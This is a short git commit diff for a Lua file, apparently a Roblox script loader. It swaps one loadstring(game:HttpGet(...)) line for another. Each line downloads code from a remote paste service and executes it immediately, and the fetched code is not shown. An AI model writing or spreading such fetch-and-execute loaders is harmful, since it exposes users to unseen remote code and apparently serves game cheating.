77992ce79afa9364fd449421d3305d5efbea266e
dorb <newmaillessgooonewmaillessgooo@gmail.com>
2026-03-01 17:39:53 -0500

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/ixbFijCN"))()
---loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/sVuOeRZ2NofshWSx/raw"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/sVuOeRZ2NofshWSx/raw"))()
